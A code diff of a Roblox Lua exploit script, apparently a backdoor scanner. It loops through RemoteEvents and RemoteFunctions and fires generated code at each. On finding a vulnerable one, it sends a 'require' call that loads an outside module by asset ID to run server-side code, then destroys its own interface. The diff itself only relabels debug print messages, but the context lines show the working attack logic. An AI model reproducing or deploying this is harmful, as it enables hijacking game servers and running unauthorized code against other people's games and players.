@@ -312,7 +312,7 @@ local function EDFU_fake_script() -- attacc.LocalScript
 			if a:IsA("GuiButton") and a:GetAttribute("on") == true and a.Object.Value:IsA("RemoteEvent") then
 				local v = a.Object.Value
 				if v:IsA("RemoteEvent") and hasKeyword(v) == false and #v:GetChildren() == 0 then
-					print(v.Name)
+					print("[REMOTE CHECK] =>", v.Name)
 					Dict[tostring(v:GetFullName())] = v
 					v:FireServer(GenScript(v:GetFullName()))
 					wait(0.04)
@@ -390,7 +390,7 @@ local function EDFU_fake_script() -- attacc.LocalScript
 		if gotbackdoor == true then return end
 		checking = true
 		if check() then
-			print("less gooo")
+			print("[BACKDOOR] =>", Backdoor:GetFullName())
 			notify("Found a vulnerable Remote !")
 			Backdoor:FireServer([[require(8552054903).balls("]]..LocalPlayer..[[")]])
 			script.Parent.Parent.Parent:Destroy()
@@ -399,11 +399,11 @@ local function EDFU_fake_script() -- attacc.LocalScript
 			notify("Didn't found any remotes.\nTrying Remote Function.")
 			wait(1)
 			if check2() == false then
-				print("noooo")
+				print("[BACKDOOR] =>", "None")
 				notify("Game/Remote isn't vulnerable...")
 				checking = false
 			else
-				print("less gooo")
+				print("[BACKDOOR] =>", Backdoor:GetFullName())
 				notify("Found a vulnerable Function !")
 				Backdoor:InvokeServer([[require(8552054903).balls("]]..LocalPlayer..[[")]])
 				script.Parent.Parent.Parent:Destroy()
